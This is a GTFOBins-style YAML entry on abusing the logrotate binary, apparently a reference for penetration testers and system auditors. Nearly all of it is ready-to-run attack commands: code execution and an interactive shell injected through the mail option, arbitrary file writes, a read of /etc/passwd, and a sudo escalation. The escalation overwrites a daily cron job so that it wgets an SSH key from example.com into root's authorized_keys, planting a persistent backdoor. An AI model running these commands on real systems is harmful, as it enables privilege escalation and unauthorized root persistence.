---
description: Logrotate is used to rotate stale logs and perform various actions like compress the old ones, send mails, and so on. More information about exploiting logrotate may be found [here](https://joshua.hu/gaining-root-with-logrotate-sudo-ubuntu).
functions:
  command:
    - description: Requires a logrotate policy which uses the `mail` directive. A hash should be used as the final character in the command, as it is run with a few arguments.
      code: |
        logrotate -m "/usr/bin/id &> /tmp/output #" -v -f logrotate.policy
  shell:
    - description: Requires a logrotate policy which uses the `mail` directive.
      code: |
        logrotate -m "/usr/bin/bash -i #" -v -f logrotate.policy
  file-write:
    - description: Creates or overwrites the file with the exact text `logrotate state -- version 2`
      code: |
        logrotate -s /tmp/file logrotate.policy
    - description: Creates or overwrites the file with junk data in combination with arbitrary data.
      code: |
        logrotate -l /tmp/file helloworld
  file-read:
    - description: Reads the first 'word'.
      code: |
        logrotate /etc/passwd
  sudo:
    - description: If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. Note that this will overwrite `/etc/cron.daily/man-db` with a cronjob.
      code: sudo logrotate -l /etc/cron.daily/man-db '2>/dev/null;wget https://example.com/ssh.key -O /root/.ssh/authorized_keys2; exit 0;'
---
